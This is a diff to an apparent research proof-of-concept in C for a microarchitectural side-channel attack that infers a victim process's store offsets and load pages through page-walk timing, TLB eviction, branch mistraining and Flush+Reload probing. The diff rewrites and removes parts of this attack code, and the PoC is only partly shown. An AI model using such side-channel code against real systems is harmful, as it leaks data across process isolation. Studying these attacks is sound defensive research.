@@ -36,102 +36,15 @@ static u16 get_PL_index(void *ptr, u8 level) {
     u64 page = ((uintptr_t)ptr >> PAGE_SHIFT);
     return (page >> ((level - 1) * INDEX_WIDTH)) & INDEX_MASK;
 }
-
-// we only need one bit of information to indicate if page walk stalls,
-// therefore, we only need a probe array with one element, and it will be
-// accessed if page walk does not stall. So, we will have something like this:
-// probe[*load], if page walk does not stall, *load returns 0 and probe[0] is
-// acessed. However, we want *load to return a non-zero if page walk does not
-// stall, since zero can be a default value used for some forwarding (e.g.,
-// Meltdown), so we use an array with two pages and access probe[1 * page_size].
-static void flush_probe() {
-    _clflush(probe + PAGE_SIZE);
-}
-
-static bool check_probe() {
-    return _time_maccess(&probe[PAGE_SIZE], 1 /* byte */) < threshold;
-}
 // end of util functions
 
 #define VICTIM_STORE_OFFSET (0x528u)
 static int __attribute__((noinline)) store_offset_recovery() {
     int ret = 0;
-    // use the first (MISTRAIN_EPOCH - 1) iters to mistrain, then mispredict
-    const u16 MISTRAIN_EPOCH = 6;
-    const u32 MEASURES = 100;
-    static volatile u64 _size1 = 10, _size2 = 11,
-                        _size3 = 12; // slow branch gadgets
-
+    const u32 MEASURES = 1000;
     pid_t pid = fork();
     if (pid == 0) {
-        usleep(100);
-        while (true) {
-            // normal_page is NOT shared, the child process will make a copy on
-            // write
-            _mwrite(&normal_page[VICTIM_STORE_OFFSET], 0xff);
-        }
-    } else if (pid < 0) {
-        fprintf(stderr, "Failed to fork.\n");
-        return 2;
-    }
-
-    // allocate 512 pages to cover all possible PL1 (PTE) indexes
-    u8 *pages = setup_page(NULL, INDEX_COUNT * PAGE_SIZE, 0x1 /* init value */);
-    if (!pages) {
-        ret = 3;
-        goto mmap_fail;
-    }
-
-    usleep(rand() % 256);
-    for (u32 disp = 0; disp < INDEX_COUNT; disp++) {
-        u8 *ptr = pages + disp * PAGE_SIZE;
-        u32 counter = 0;
-        for (size_t cnt = 1; cnt <= MEASURES * MISTRAIN_EPOCH; cnt++) {
-            flush_probe(); // prepare F+R probe
-            _clflush_v(&_size1); // create long latency branch
-            _clflush_v(&_size2);
-            _clflush_v(&_size3);
-            ptedit_invalidate_tlb(ptr);
-            _mfence();
-
-            // tmp will be all ones (-1) if cnt % MISTRAIN_EPOCH == 0;
-            // i.e., it's time to mispredict
-            u64 tmp = ((cnt % MISTRAIN_EPOCH) - 1) & (~0xffff);
-            tmp = tmp | (tmp >> 16);
-
-            // only select probe on misprediction (i.e., tmp = -1)
-            // equivalent to arr = tmp ? probe : garbage, but branchless
-            u8 *arr = (u8 *)SEL_NOSPEC(tmp, probe, garbage);
-            _lfence();
-            if ((tmp < _size1) & (tmp < _size2) & (tmp < _size3)) {
-                // on misprediction, arr points to probe if *ptr is NOT stalled,
-                // we can observe signals from probe[PAGE_SIZE]
-                _maccess(&arr[*ptr * PAGE_SIZE]);
-            }
-            _lfence();
-
-            // check if *ptr successfully returns 0x1 during misprediction
-            if (tmp && check_probe()) {
-                counter += 1;
-            }
-        }
-
-        u16 pte_offset = ((uintptr_t)ptr & 0x1ff000) >> 9;
-        printf("%#5x\t%3d\n", pte_offset, counter);
-    }
-
-    munmap(pages, INDEX_COUNT * PAGE_SIZE);
-mmap_fail:
-    kill(pid, SIGKILL);
-    return ret;
-}
-
-static int __attribute__((noinline)) store_offset_recovery_latency() {
-    int ret = 0;
-    const u32 MEASURES = 10000;
-    pid_t pid = fork();
-    if (pid == 0) {
-        usleep(200);
+        usleep(100); // a little sleep helps
         while (true) {
             // normal_page is NOT shared, the child process will make a copy on
             // write
@@ -143,10 +56,13 @@ static int __attribute__((noinline)) store_offset_recovery_latency() {
     }
 
     usleep(rand() % 256);
-    u32 factor = 3;
-    u64 num_pages = 512 * factor; // = 128 * 12 = sTLB size on Skylake
-    // allocate 512 pages to cover all possible PL1 (PTE) indexes
-    u8 *pages = setup_page(NULL, num_pages * PAGE_SIZE, 0x1 /* init value */);
+    u32 factor = 4;
+    u64 num_pages = 512 * factor; // > sTLB size on Skylake
+    u8 *pages = mmap(NULL, num_pages * PAGE_SIZE, PROT_READ | PROT_WRITE,
+                     MAP_PRIVATE | MAP_ANONYMOUS, -1 /* fd */, 0 /* offset */);
+    // these pages are not initialized on purpose, so that they are mapped
+    // to the same physical page. This can help prevent data from being evicted
+    // from caches, while still evict translations from TLBs
     if (!pages) {
         ret = 3;
         goto mmap_fail;
@@ -159,8 +75,8 @@ static int __attribute__((noinline)) store_offset_recovery_latency() {
     memset(results, 0, sizeof(u64) * 512);
 
     for (u64 cnt = 0; cnt < num_pages * MEASURES; cnt++) {
-        u64 idx = (cnt * 167 + 13) % num_pages;
-        u8 *ptr = pages + idx * PAGE_SIZE + ((cnt * 167 + 13) % 64) * 64;
+        u64 idx = (cnt * 167 + 13) % num_pages; // "randomize the order"
+        u8 *ptr = pages + idx * PAGE_SIZE;
         u32 sig;
         u64 t_start, t_diff;
 
@@ -342,7 +258,6 @@ static int __attribute__((noinline)) load_page_recovery_contention() {
 }
 
 #define STORE_OFFSET_POC "store_offset"
-#define STORE_OFFSET_LAT_POC "store_offset_latency"
 #define LOAD_PAGE_TRP_POC "load_page_throughput"
 #define LOAD_PAGE_CTT_POC "load_page_contention"
 
@@ -350,7 +265,6 @@ int main(int argc, char **argv) {
     if (argc < 2) {
         fprintf(stderr, "Expect one of these arguments:\n"
                         "\t" STORE_OFFSET_POC "\n"
-                        "\t" STORE_OFFSET_LAT_POC "\n"
                         "\t" LOAD_PAGE_TRP_POC "\n"
                         "\t" LOAD_PAGE_CTT_POC "\n");
         return 1;
@@ -379,8 +293,6 @@ int main(int argc, char **argv) {
     srand(0);
     if (strcmp(argv[1], STORE_OFFSET_POC) == 0) {
         ret = store_offset_recovery();
-    } else if (strcmp(argv[1], STORE_OFFSET_LAT_POC) == 0) {
-        ret = store_offset_recovery_latency();
     } else if (strcmp(argv[1], LOAD_PAGE_TRP_POC) == 0) {
         ret = load_page_recovery_throughput();
     } else if (strcmp(argv[1], LOAD_PAGE_CTT_POC) == 0) {
